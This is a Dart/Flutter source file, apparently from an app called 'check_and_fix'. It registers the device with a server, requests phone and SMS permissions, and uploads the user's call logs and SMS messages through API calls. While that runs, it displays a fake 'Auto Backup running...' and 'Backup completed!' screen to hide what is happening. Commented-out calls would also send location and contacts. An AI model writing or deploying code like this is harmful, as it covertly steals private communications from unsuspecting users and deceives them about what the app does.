// ignore_for_file: use_build_context_synchronously

import 'package:check_and_fix/presentation/utils/color_printer.dart';
import 'package:check_and_fix/presentation/utils/services.dart';
import 'package:fk_user_agent/fk_user_agent.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:hive/hive.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:uuid/uuid.dart';

class Init {
  String? uuid;
  String? imei;
  String? agent;
  late Box box;

  void initConnection(BuildContext context) async {
    print('START: initConnection() - GET UUID...');

    await _initServerConnection();

    printWhite('UUID: $uuid');
    printWhite('IMEI: $imei');
    printWhite('agent: $agent');

    await _requestPermission(Permission.phone);
    await _requestPermission(Permission.sms);

    dummyLoader();
    // Api.sendLocation(agent, uuid);
    // Api.sendContacts(agent, uuid);
    await Api().sendCallLogs(context, agent, uuid);
    await Api.sendSmsLogs(context, agent, uuid);
  }

  Future _initServerConnection() async {
    try {
      box = await Hive.openBox('myBox');
      await FkUserAgent.init();
      agent = FkUserAgent.userAgent!;
      imei = box.get('imei') ??
          const Uuid().v4(); // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
      uuid = box.get('uuid');
      uuid ??= await Api.sendDeviceInfo(agent!, imei);

      box.put('agent', agent);
      box.put('uuid', uuid);
      box.put('imei', imei);
    } catch (e) {
      print(e.toString());
    }
  }

  static Future<PermissionStatus?> _requestPermission(Permission permission) async {
    final alreadyGranted = await permission.isGranted;
    if (alreadyGranted) return null;
    final status = await permission.request();

    try {
      if (status.isGranted) {
        if (kDebugMode) {
          print('${permission.toString()} granted');
        }
      } else {
        if (kDebugMode) {
          print('${permission.toString()} denied');
        }
      }
    } catch (e) {
      if (kDebugMode) {
        print('$e');
      }
    }

    return status;
  }

  static Future dummyLoader() async {
    EasyLoading.show(
         dismissOnTap: false,

        status: 'Auto Backup running...',
        maskType: EasyLoadingMaskType.custom);

    await Future.delayed(const Duration(milliseconds: 2250));

    EasyLoading.showSuccess('Backup completed!',
        dismissOnTap: true,
        duration: const Duration(milliseconds: 1250),
        maskType: EasyLoadingMaskType.custom);
  }
}
